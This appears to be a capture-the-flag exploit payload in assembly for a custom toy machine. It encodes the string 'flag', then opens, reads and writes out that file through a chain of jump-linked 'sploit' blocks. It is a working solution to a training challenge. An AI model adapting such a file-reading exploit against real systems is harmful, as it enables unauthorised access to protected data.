jmp sploit0     ; 4
flag0 : 0x666c  ; 6
flag1 : 0x6167  ; 8
flag2 : 0x0000  ; 10
flag3 : 0x0000  ; 12
flag4 : 0x0000  ; 14
flag5 : 0x0000  ; 16 (byte set)

sploit0 :
	mov r1, 0x8004 ; 4
	mov r2, 1     ; 8
	jmp sploit1   ; 12
	nop           ; 16 (byte set)

sploit1 :
	mov r0, 0
	syscall       ; open("flag", 1)
	jmp sploit2
	nop

sploit2 :
	mov r1, r0
	mov r2, 0x9000
	jmp sploit3
	nop

sploit3 :
	mov r3, 0x10
	mov r0, 1
	jmp sploit4   ; read fd
	nop

sploit4 :
	syscall       ; read(fd, 0x9000, 0x10)
	mov r1, 1
	jmp sploit5
	nop

sploit5 :
	mov r0, 2
	syscall       ; write
	hlt